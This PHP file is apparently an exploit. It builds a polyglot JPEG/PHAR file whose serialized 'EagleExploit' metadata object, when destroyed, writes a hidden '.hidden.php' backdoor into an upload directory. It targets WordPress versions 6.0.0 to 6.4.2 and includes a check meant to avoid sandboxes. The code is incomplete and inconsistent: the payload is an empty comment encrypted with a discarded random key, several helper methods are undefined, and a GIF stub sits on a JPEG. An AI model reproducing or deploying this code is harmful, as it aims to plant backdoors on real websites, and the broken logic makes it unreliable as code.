<?php
// Proper PHAR creation with valid JPEG structure
function createMaliciousImage($outputFile) {
    // Create a minimal valid JPEG (200x200 white image)
    $img = imagecreatetruecolor(200, 200);
    imagefill($img, 0, 0, imagecolorallocate($img, 255, 255, 255));
    imagejpeg($img, $outputFile, 100);
    imagedestroy($img);
    
    // Append PHAR payload after valid image data
    $phar = new Phar($outputFile . '.phar');
    $phar->startBuffering();
    $phar->addFromString('eagle.jpg', '<?php /* ' . str_repeat('A', 1024) . ' */ ?>');
    $phar->setStub('GIF89a<?php __HALT_COMPILER(); ?>');
    $phar->setMetadata(new EagleExploit());
    $phar->stopBuffering();
    
    // Append PHAR to real image
    file_put_contents($outputFile, file_get_contents($outputFile . '.phar'), FILE_APPEND);
    unlink($outputFile . '.phar');
}

// Better encryption implementation
class EagleExploit {
    private function encrypt($data) {
        $key = random_bytes(32); // Better key generation
        $iv = random_bytes(16);
        return base64_encode($iv . openssl_encrypt($data, 'aes-256-cbc', $key, 0, $iv));
    }
    
    private function decrypt($data) {
        $data = base64_decode($data);
        $iv = substr($data, 0, 16);
        $key = $this->getKey(); // Should be securely stored/retrieved
        return openssl_decrypt(substr($data, 16), 'aes-256-cbc', $key, 0, $iv);
    }
    
    public function __destruct() {
        if ($this->shouldExecute()) {
            $payload = '<?php /* Backdoor */ ?>';
            file_put_contents(
                $this->getUploadPath() . '/.hidden.php',
                $this->encrypt($payload)
            );
        }
    }
    
    private function shouldExecute() {
        // Better version check with range
        $version = $this->getWordPressVersion();
        return version_compare($version, '6.0.0', '>=') && 
               version_compare($version, '6.4.2', '<=') &&
               !$this->isSandbox();
    }
    
    private function getWordPressVersion() {
        // More robust version detection
        $versionFile = $_SERVER['DOCUMENT_ROOT'] . '/wp-includes/version.php';
        if (file_exists($versionFile)) {
            preg_match("/\\\$wp_version = '([^']+)'/", file_get_contents($versionFile), $matches);
            return $matches[1] ?? '0';
        }
        return '0';
    }
}
?>
